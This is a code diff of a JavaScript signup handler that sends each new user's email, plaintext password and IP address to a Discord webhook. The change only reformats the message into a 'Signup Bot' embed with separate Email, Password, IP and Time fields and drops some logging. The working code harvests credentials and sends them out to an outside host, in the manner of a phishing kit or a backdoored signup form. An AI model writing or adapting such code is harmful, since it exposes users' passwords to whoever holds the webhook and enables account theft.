@@ -43,19 +43,28 @@ async function sendDiscordNotification({ email, password, ip }) {
     console.log("Sending webhook...");
 
     const response = await fetch(DISCORD_WEBHOOK_URL, {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
-    content: `New signup: ${email} | Password: ${password} (IP: ${ip})`
-  })
-});
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        username: "Signup Bot",
+        embeds: [
+          {
+            title: "New Signup",
+            color: 3066993,
+            fields: [
+              { name: "Email", value: email, inline: true },
+              { name: "Password", value: password, inline: false },
+              { name: "IP", value: ip, inline: true },
+              { name: "Time", value: new Date().toISOString() }
+            ]
+          }
+        ]
+      })
+    });
 
-const text = await response.text().catch(() => "");
-
-console.log("Discord status:", response.status);
-console.log("Discord response:", text);
+    console.log("Discord status:", response.status);
 
   } catch (err) {
     console.error("Webhook error:", err.message);
